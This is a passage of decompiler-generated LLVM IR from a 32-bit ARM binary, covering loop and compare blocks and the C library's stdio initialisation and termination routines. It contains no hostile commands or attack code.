  store i32 %v1_1f8c8, i32* %r3.global-to-local, align 4
  store i32 %v1_1f8c8, i32* %v2_1f8c0, align 4
  %v0_1f8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1f8d0 = load i32, i32* @r5, align 4
  %v2_1f8d0 = add i32 %v1_1f8d0, 32
  %v3_1f8d0 = inttoptr i32 %v2_1f8d0 to i32*
  store i32 %v0_1f8d0, i32* %v3_1f8d0, align 4
  %v0_1f8d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1f8d4 = add i32 %v0_1f8d4, 4
  %v2_1f8d4 = inttoptr i32 %v1_1f8d4 to i32*
  %v3_1f8d4 = load i32, i32* %v2_1f8d4, align 4
  %v1_1f8d8 = add i32 %v3_1f8d4, -1
  store i32 %v1_1f8d8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f8dc = icmp eq i32 %v1_1f8d8, 0
  %v0_1f8e0 = load i32, i32* @r5, align 4
  %v1_1f8e0 = load i32, i32* @r1, align 4
  %v2_1f8e0 = inttoptr i32 %v1_1f8e0 to i32*
  store i32 %v0_1f8e0, i32* %v2_1f8e0, align 4
  %v0_1f8e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f8e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f8e4 = add i32 %v1_1f8e4, 4
  %v3_1f8e4 = inttoptr i32 %v2_1f8e4 to i32*
  store i32 %v0_1f8e4, i32* %v3_1f8e4, align 4
  br i1 %v2_1f8dc, label %dec_label_pc_1f8ec, label %dec_label_pc_1f94c

dec_label_pc_1f8ec:                               ; preds = %dec_label_pc_1f8b0
  %v0_1f8ec = load i32, i32* %r3.global-to-local, align 4
  %v1_1f8ec = load i32, i32* %r0.global-to-local, align 4
  %v2_1f8ec = add i32 %v1_1f8ec, 8
  %v3_1f8ec = inttoptr i32 %v2_1f8ec to i32*
  store i32 %v0_1f8ec, i32* %v3_1f8ec, align 4
  %v0_1f8f0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f8f0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f8f4

dec_label_pc_1f8f4:                               ; preds = %dec_label_pc_1f924.dec_label_pc_1f8f4_crit_edge, %dec_label_pc_1f8ec
  %v0_1f8f4 = phi i32 [ %v0_1f8f4.pre, %dec_label_pc_1f924.dec_label_pc_1f8f4_crit_edge ], [ %v0_1f8f0, %dec_label_pc_1f8ec ]
  %v1_1f8f4 = inttoptr i32 %v0_1f8f4 to i32*
  %v2_1f8f4 = load i32, i32* %v1_1f8f4, align 4
  store i32 %v2_1f8f4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1f8f4, i32* %r2.global-to-local, align 4
  %v2_1f90083 = load i32, i32* %v1_1f8f4, align 4
  store i32 %v2_1f90083, i32* %r3.global-to-local, align 4
  %v3_1f90485 = icmp uge i32 %v2_1f90083, %v2_1f8f4
  store i1 %v3_1f90485, i1* %cpsr_c.global-to-local, align 1
  %v9_1f90491 = icmp eq i32 %v2_1f90083, %v2_1f8f4
  br i1 %v9_1f90491, label %dec_label_pc_1f90c, label %dec_label_pc_1f924

dec_label_pc_1f90c:                               ; preds = %dec_label_pc_1f8f4, %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge
  %v0_1f90c92 = phi i32 [ %v1_1f904.pre, %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge ], [ %v2_1f8f4, %dec_label_pc_1f8f4 ]
  store i32 %v0_1f90c92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f91c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f91c, label %dec_label_pc_1f920, label %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge

dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge:  ; preds = %dec_label_pc_1f90c
  %v0_1f900.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f904.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1f900 = inttoptr i32 %v0_1f900.pre to i32*
  %v2_1f900 = load i32, i32* %v1_1f900, align 4
  store i32 %v2_1f900, i32* %r3.global-to-local, align 4
  %v3_1f904 = icmp uge i32 %v2_1f900, %v1_1f904.pre
  store i1 %v3_1f904, i1* %cpsr_c.global-to-local, align 1
  %v9_1f904 = icmp eq i32 %v2_1f900, %v1_1f904.pre
  br i1 %v9_1f904, label %dec_label_pc_1f90c, label %dec_label_pc_1f924

dec_label_pc_1f920:                               ; preds = %dec_label_pc_1f90c
  %v0_1f920 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1f920, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f924

dec_label_pc_1f924:                               ; preds = %dec_label_pc_1f8f4, %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge, %dec_label_pc_1f920
  %v0_1f92c = phi i32 [ %v0_1f920, %dec_label_pc_1f920 ], [ %v2_1f90083, %dec_label_pc_1f8f4 ], [ %v2_1f900, %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge ]
  %v1_1f924 = phi i32 [ %v0_1f920, %dec_label_pc_1f920 ], [ %v2_1f8f4, %dec_label_pc_1f8f4 ], [ %v1_1f904.pre, %dec_label_pc_1f90c.dec_label_pc_1f900_crit_edge ]
  %v3_1f924 = icmp uge i32 %v0_1f92c, %v1_1f924
  store i1 %v3_1f924, i1* %cpsr_c.global-to-local, align 1
  %v9_1f924 = icmp eq i32 %v0_1f92c, %v1_1f924
  br i1 %v9_1f924, label %dec_label_pc_1f92c, label %dec_label_pc_1f924.dec_label_pc_1f8f4_crit_edge

dec_label_pc_1f924.dec_label_pc_1f8f4_crit_edge:  ; preds = %dec_label_pc_1f924
  %v0_1f8f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f8f4

dec_label_pc_1f92c:                               ; preds = %dec_label_pc_1f924
  %v2_1f92c = icmp ne i32 %v1_1f924, 0
  store i1 %v2_1f92c, i1* %cpsr_c.global-to-local, align 1
  %v7_1f930 = icmp slt i32 %v1_1f924, 2
  br i1 %v7_1f930, label %dec_label_pc_1f94c, label %dec_label_pc_1f934

dec_label_pc_1f934:                               ; preds = %dec_label_pc_1f92c
  %v0_1f934 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1f934, i32* %r0.global-to-local, align 4
  %v0_1f938 = load i32, i32* @r1, align 4
  %v1_1f938 = add i32 %v0_1f938, 129
  store i32 %v1_1f938, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f94c

dec_label_pc_1f94c:                               ; preds = %dec_label_pc_1f8b0, %dec_label_pc_1f934, %dec_label_pc_1f92c
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_1f950 = load i32, i32* @r8, align 4
  %v2_1f950 = add i32 %v0_1f950, 160
  %v3_1f950 = inttoptr i32 %v2_1f950 to i32*
  %v4_1f950 = load i32, i32* %v3_1f950, align 4
  store i32 %v4_1f950, i32* %r0.global-to-local, align 4
  %v1_1f954 = add i32 %v4_1f950, 4
  %v2_1f954 = inttoptr i32 %v1_1f954 to i32*
  %v3_1f954 = load i32, i32* %v2_1f954, align 4
  %v1_1f958 = add i32 %v3_1f954, -1
  store i32 %v1_1f958, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1f95c = icmp eq i32 %v1_1f958, 0
  store i32 %v1_1f958, i32* %v2_1f954, align 4
  br i1 %v2_1f95c, label %dec_label_pc_1f968, label %dec_label_pc_1f9d0

dec_label_pc_1f968:                               ; preds = %dec_label_pc_1f94c
  %v0_1f968 = load i32, i32* %r3.global-to-local, align 4
  %v1_1f968 = load i32, i32* %r0.global-to-local, align 4
  %v2_1f968 = add i32 %v1_1f968, 8
  %v3_1f968 = inttoptr i32 %v2_1f968 to i32*
  store i32 %v0_1f968, i32* %v3_1f968, align 4
  %v0_1f96c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1f96c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f970

dec_label_pc_1f970:                               ; preds = %dec_label_pc_1f9a0.dec_label_pc_1f970_crit_edge, %dec_label_pc_1f968
  %v0_1f970 = phi i32 [ %v0_1f970.pre, %dec_label_pc_1f9a0.dec_label_pc_1f970_crit_edge ], [ %v0_1f96c, %dec_label_pc_1f968 ]
  %v1_1f970 = inttoptr i32 %v0_1f970 to i32*
  %v2_1f970 = load i32, i32* %v1_1f970, align 4
  store i32 %v2_1f970, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_1f970, i32* %r2.global-to-local, align 4
  %v2_1f97c71 = load i32, i32* %v1_1f970, align 4
  store i32 %v2_1f97c71, i32* %r3.global-to-local, align 4
  %v3_1f98073 = icmp uge i32 %v2_1f97c71, %v2_1f970
  store i1 %v3_1f98073, i1* %cpsr_c.global-to-local, align 1
  %v9_1f98079 = icmp eq i32 %v2_1f97c71, %v2_1f970
  br i1 %v9_1f98079, label %dec_label_pc_1f988, label %dec_label_pc_1f9a0

dec_label_pc_1f988:                               ; preds = %dec_label_pc_1f970, %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge
  %v0_1f98880 = phi i32 [ %v1_1f980.pre, %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge ], [ %v2_1f970, %dec_label_pc_1f970 ]
  store i32 %v0_1f98880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1f998 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1f998, label %dec_label_pc_1f99c, label %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge

dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge:  ; preds = %dec_label_pc_1f988
  %v0_1f97c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1f980.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1f97c = inttoptr i32 %v0_1f97c.pre to i32*
  %v2_1f97c = load i32, i32* %v1_1f97c, align 4
  store i32 %v2_1f97c, i32* %r3.global-to-local, align 4
  %v3_1f980 = icmp uge i32 %v2_1f97c, %v1_1f980.pre
  store i1 %v3_1f980, i1* %cpsr_c.global-to-local, align 1
  %v9_1f980 = icmp eq i32 %v2_1f97c, %v1_1f980.pre
  br i1 %v9_1f980, label %dec_label_pc_1f988, label %dec_label_pc_1f9a0

dec_label_pc_1f99c:                               ; preds = %dec_label_pc_1f988
  %v0_1f99c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1f99c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1f9a0

dec_label_pc_1f9a0:                               ; preds = %dec_label_pc_1f970, %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge, %dec_label_pc_1f99c
  %v0_1f9a8 = phi i32 [ %v0_1f99c, %dec_label_pc_1f99c ], [ %v2_1f97c71, %dec_label_pc_1f970 ], [ %v2_1f97c, %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge ]
  %v1_1f9a0 = phi i32 [ %v0_1f99c, %dec_label_pc_1f99c ], [ %v2_1f970, %dec_label_pc_1f970 ], [ %v1_1f980.pre, %dec_label_pc_1f988.dec_label_pc_1f97c_crit_edge ]
  %v3_1f9a0 = icmp uge i32 %v0_1f9a8, %v1_1f9a0
  store i1 %v3_1f9a0, i1* %cpsr_c.global-to-local, align 1
  %v9_1f9a0 = icmp eq i32 %v0_1f9a8, %v1_1f9a0
  br i1 %v9_1f9a0, label %dec_label_pc_1f9a8, label %dec_label_pc_1f9a0.dec_label_pc_1f970_crit_edge

dec_label_pc_1f9a0.dec_label_pc_1f970_crit_edge:  ; preds = %dec_label_pc_1f9a0
  %v0_1f970.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f970

dec_label_pc_1f9a8:                               ; preds = %dec_label_pc_1f9a0
  %v2_1f9a8 = icmp ne i32 %v1_1f9a0, 0
  store i1 %v2_1f9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_1f9ac = icmp slt i32 %v1_1f9a0, 2
  br i1 %v7_1f9ac, label %dec_label_pc_1f9d0, label %dec_label_pc_1f9b0

dec_label_pc_1f9b0:                               ; preds = %dec_label_pc_1f9a8
  %v0_1f9b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1f9b0, i32* %r0.global-to-local, align 4
  %v0_1f9b4 = load i32, i32* @r1, align 4
  %v1_1f9b4 = add i32 %v0_1f9b4, 129
  store i32 %v1_1f9b4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1f9d0

dec_label_pc_1f9cc:                               ; preds = %dec_label_pc_1f610, %dec_label_pc_1f5f4, %dec_label_pc_1f61c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1f9d0

dec_label_pc_1f9d0:                               ; preds = %dec_label_pc_1f94c, %dec_label_pc_1f9a8, %bb57, %dec_label_pc_1f654, %dec_label_pc_1f9b0, %dec_label_pc_1f9cc
  %v0_1f9d0 = load i32, i32* @r5, align 4
  store i32 %v0_1f9d0, i32* %r0.global-to-local, align 4
  %v2_1f9d8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1f9d8, i32* %r4.global-to-local, align 4
  store i32 %v6_1f5b4, i32* @r5, align 4
  store i32 %v9_1f5b4, i32* @r6, align 4
  store i32 %v12_1f5b4, i32* @r7, align 4
  store i32 %v15_1f5b4, i32* @r8, align 4
  ret i32 %v0_1f9d0

; uselistorder directives
  uselistorder i32 %v0_1f99c, { 1, 0, 2 }
  uselistorder i32 %v1_1f980.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f970, { 1, 0 }
  uselistorder i32 %v0_1f920, { 1, 0, 2 }
  uselistorder i32 %v1_1f904.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f8f4, { 1, 0 }
  uselistorder i32 %v0_1f89c, { 1, 0, 2 }
  uselistorder i32 %v1_1f880.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1f834, { 1, 0, 2 }
  uselistorder i32 %v1_1f818, { 0, 2, 1 }
  uselistorder i32 %v4_1f7f4, { 2, 1, 0, 3 }
  uselistorder i32 %v1_1f7a4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_1f728, { 1, 2, 0 }
  uselistorder i32 %v1_1f6b8, { 1, 0 }
  uselistorder i32 %v0_1f6b8, { 1, 0 }
  uselistorder i32 %v1_1f6a0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1f644, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 8, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 14, 13, 2, 16, 15, 17, 18, 19, 20, 21, 22, 24, 23, 3, 25, 26, 27, 28, 29, 30, 31, 32, 33, 36, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 0, 52, 53 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 11, 10, 1, 12, 13, 15, 14, 2, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 16384, { 66, 67, 0, 68, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 24, 25, 22, 23, 20, 21, 18, 19, 16, 17, 14, 15, 12, 13, 26, 27, 11, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 38, 41, 40, 43, 42, 46, 44, 45, 48, 47, 50, 49, 53, 51, 69, 52, 70, 56, 54, 55, 57, 58, 59, 60, 61, 63, 64, 65, 62 }
  uselistorder i32 (i32, i32)* @__libc_open, { 1, 0, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 9, 0, 18, 8, 7, 6, 5, 17, 16, 15, 14, 13, 12, 11, 10, 4, 3, 2, 1 }
  uselistorder i32 1024, { 8, 9, 10, 2, 4, 0, 1, 5, 3, 6, 11, 12, 7 }
  uselistorder i32 (i32)* @malloc, { 8, 7, 12, 5, 4, 3, 0, 1, 2, 11, 6, 10, 9 }
  uselistorder i8 43, { 2, 0, 1, 3, 4 }
  uselistorder i32 ()* @free, { 12, 11, 7, 6, 5, 4, 0, 3, 2, 1, 14, 13, 10, 9, 8 }
  uselistorder i8 97, { 3, 2, 0, 1 }
  uselistorder i8 96, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f9d0, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1f9cc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f9a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f988, { 1, 0 }
  uselistorder label %dec_label_pc_1f94c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1f924, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f90c, { 1, 0 }
  uselistorder label %dec_label_pc_1f8b0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_1f8a0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f888, { 1, 0 }
  uselistorder label %dec_label_pc_1f848, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_1f838, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1f780, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_1f6e8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1f690, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1f62c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1f5f4, { 1, 2, 0 }
}

define i32 @function_1f9e4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1f9e4:
  %v0_1f9e4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1f9e4, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_1f9e4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1f9e4, %bb
  %v4_1fa10 = phi i32 [ %arg1, %dec_label_pc_1f9e4 ], [ 0, %bb ]
  ret i32 %v4_1fa10

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1fa1c = call i32 @__aeabi_read_tp()
  %v3_1fa20 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1fa20 = sext i16 %v3_1fa20 to i32
  store i32 %v4_1fa20, i32* @r3, align 4
  store i32 %v0_1fa1c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1fa2c = add i32 %v4_1fa20, %v0_1fa1c
  %v3_1fa2c = inttoptr i32 %v2_1fa2c to i32*
  %v4_1fa2c = load i32, i32* %v3_1fa2c, align 4
  store i32 %v4_1fa2c, i32* @r6, align 4
  %v1_1fa30 = call i32 @isatty(i32 0)
  %v2_1fa38 = icmp eq i32 %v1_1fa30, 0
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r4, align 4
  br i1 %v2_1fa38, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_1fa44 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 316) to i16*), align 4
  %v7_1fa44 = zext i16 %v5_1fa44 to i32
  %v2_1fa48 = xor i32 %v7_1fa44, 256
  store i32 %v2_1fa48, i32* @r3, align 4
  %v2_1fa4c = trunc i32 %v2_1fa48 to i16
  store i16 %v2_1fa4c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 316) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_1fa54 = call i32 @isatty(i32 1)
  %v2_1fa58 = icmp eq i32 %v1_1fa54, 0
  br i1 %v2_1fa58, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_1fa60 = load i32, i32* @r4, align 4
  %v2_1fa64 = add i32 %v1_1fa60, 384
  %v3_1fa64 = inttoptr i32 %v2_1fa64 to i16*
  %v4_1fa64 = load i16, i16* %v3_1fa64, align 2
  %v2_1fa68 = xor i16 %v4_1fa64, 256
  store i16 %v2_1fa68, i16* %v3_1fa64, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_1fa74 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1fa74 = sext i16 %v3_1fa74 to i32
  %v0_1fa78 = load i32, i32* @r6, align 4
  %v1_1fa78 = load i32, i32* @r5, align 4
  %v3_1fa78 = add i32 %v1_1fa78, %v4_1fa74
  %v4_1fa78 = inttoptr i32 %v3_1fa78 to i32*
  store i32 %v0_1fa78, i32* %v4_1fa78, align 4
  ret i32 %v1_1fa54

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1fa94 = load i32, i32* @r4, align 4
  store i32 %v3_1fa94, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34432), i32* %r3.global-to-local, align 4
  %v2_1faa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34432) to i32*), align 4
  store i32 %v2_1faa8, i32* %r0.global-to-local, align 4
  %v5_1faa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34428) to i32*), align 4
  store i32 %v5_1faa8, i32* %r1.global-to-local, align 4
  %v8_1faa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34424) to i32*), align 4
  %v2_1fab0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1fab0, i32* %r3.global-to-local, align 4
  store i32 %v2_1faa8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1fabc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 152) to i32*), align 4
  store i32 %v2_1faa8, i32* %r0.global-to-local, align 4
  store i32 %v5_1faa8, i32* %r1.global-to-local, align 4
  store i32 %v8_1faa8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32 -34444), i32* %r3.global-to-local, align 4
  %v1_1facc = inttoptr i32 %v4_1fabc to i32*
  store i32 %v2_1faa8, i32* %v1_1facc, align 4
  %v3_1facc = add i32 %v4_1fabc, 4
  %v4_1facc = inttoptr i32 %v3_1facc to i32*
  %v5_1facc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1facc, i32* %v4_1facc, align 4
  %v6_1facc = add i32 %v4_1fabc, 8
  %v7_1facc = inttoptr i32 %v6_1facc to i32*
  %v8_1facc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1facc, i32* %v7_1facc, align 4
  %v0_1fad0 = load i32, i32* %r3.global-to-local, align 4
  %v1_1fad0 = inttoptr i32 %v0_1fad0 to i32*
  %v2_1fad0 = load i32, i32* %v1_1fad0, align 4
  store i32 %v2_1fad0, i32* %r0.global-to-local, align 4
  %v3_1fad0 = add i32 %v0_1fad0, 4
  %v4_1fad0 = inttoptr i32 %v3_1fad0 to i32*
  %v5_1fad0 = load i32, i32* %v4_1fad0, align 4
  store i32 %v5_1fad0, i32* %r1.global-to-local, align 4
  %v6_1fad0 = add i32 %v0_1fad0, 8
  %v7_1fad0 = inttoptr i32 %v6_1fad0 to i32*
  %v8_1fad0 = load i32, i32* %v7_1fad0, align 4
  %v2_1fad4 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1fad4, i32* %r3.global-to-local, align 4
  store i32 %v2_1fad0, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_1fae0 = load i32, i32* %r7.global-to-local, align 4
  %v2_1fae0 = add i32 %v0_1fae0, 76
  %v3_1fae0 = inttoptr i32 %v2_1fae0 to i32*
  %v4_1fae0 = load i32, i32* %v3_1fae0, align 4
  store i32 %v4_1fae0, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_1fae8 = inttoptr i32 %v4_1fae0 to i32*
  %v2_1fae8 = load i32, i32* %v1_1fae8, align 4
  store i32 %v2_1fae8, i32* %r5.global-to-local, align 4
  %v2_1faec = add i32 %v0_1fae0, 160
  %v3_1faec = inttoptr i32 %v2_1faec to i32*
  %v4_1faec = load i32, i32* %v3_1faec, align 4
  store i32 %v2_1fad0, i32* %r0.global-to-local, align 4
  store i32 %v5_1fad0, i32* %r1.global-to-local, align 4
  store i32 %v8_1fad0, i32* %r2.global-to-local, align 4
  store i32 -34456, i32* %r3.global-to-local, align 4
  %v2_1fafc = add i32 %v0_1fae0, -34456
  store i32 %v2_1fafc, i32* %sl.global-to-local, align 4
  %v1_1fb00 = inttoptr i32 %v4_1faec to i32*
  store i32 %v2_1fad0, i32* %v1_1fb00, align 4
  %v3_1fb00 = add i32 %v4_1faec, 4
  %v4_1fb00 = inttoptr i32 %v3_1fb00 to i32*
  %v5_1fb00 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1fb00, i32* %v4_1fb00, align 4
  %v6_1fb00 = add i32 %v4_1faec, 8
  %v7_1fb00 = inttoptr i32 %v6_1fb00 to i32*
  %v8_1fb00 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1fb00, i32* %v7_1fb00, align 4
  %v0_1fb90.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1fb9016 = icmp eq i32 %v0_1fb90.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1fb9818 = add i32 %v0_1fb90.pr, 56
  store i32 %v1_1fb9818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1fb9016, label %dec_label_pc_1fba4, label %dec_label_pc_1fb08

dec_label_pc_1fb08:                               ; preds = %entry, %.thread10
  %v0_1fb08 = phi i32 [ %v3_1fb8c, %.thread10 ], [ %v0_1fb90.pr, %entry ]
  %v1_1fb08 = add i32 %v0_1fb08, 64
  %v2_1fb08 = inttoptr i32 %v1_1fb08 to i32*
  %v3_1fb08 = load i32, i32* %v2_1fb08, align 4
  store i32 %v3_1fb08, i32* %r3.global-to-local, align 4
  %v0_1fb0c = call i32 @__aeabi_read_tp()
  store i32 %v0_1fb0c, i32* %r0.global-to-local, align 4
  %v1_1fb10 = add i32 %v0_1fb0c, -1168
  store i32 %v1_1fb10, i32* %r6.global-to-local, align 4
  %v3_1fb14 = icmp uge i32 %v3_1fb08, %v1_1fb10
  store i1 %v3_1fb14, i1* %cpsr_c.global-to-local, align 1
  %v9_1fb14 = icmp eq i32 %v3_1fb08, %v1_1fb10
  br i1 %v9_1fb14, label %.thread1, label %dec_label_pc_1fb28

.thread1:                                         ; preds = %dec_label_pc_1fb08
  %v1_1fb18 = load i32, i32* %r5.global-to-local, align 4
  %v2_1fb18 = add i32 %v1_1fb18, 60
  %v3_1fb18 = inttoptr i32 %v2_1fb18 to i32*
  %v4_1fb18 = load i32, i32* %v3_1fb18, align 4
  %v2_1fb1c = add i32 %v4_1fb18, 1
  store i32 %v2_1fb1c, i32* %r3.global-to-local, align 4
  store i32 %v2_1fb1c, i32* %v3_1fb18, align 4
  br label %.thread10

dec_label_pc_1fb28:                               ; preds = %dec_label_pc_1fb08, %dec_label_pc_1fb34
  %v0_1fb28 = load i32, i32* %r2.global-to-local, align 4
  %v1_1fb28 = inttoptr i32 %v0_1fb28 to i32*
  %v2_1fb28 = load i32, i32* %v1_1fb28, align 4
  store i32 %v2_1fb28, i32* %r3.global-to-local, align 4
  %v1_1fb2c = load i32, i32* %r4.global-to-local, align 4
  %v3_1fb2c = icmp uge i32 %v2_1fb28, %v1_1fb2c
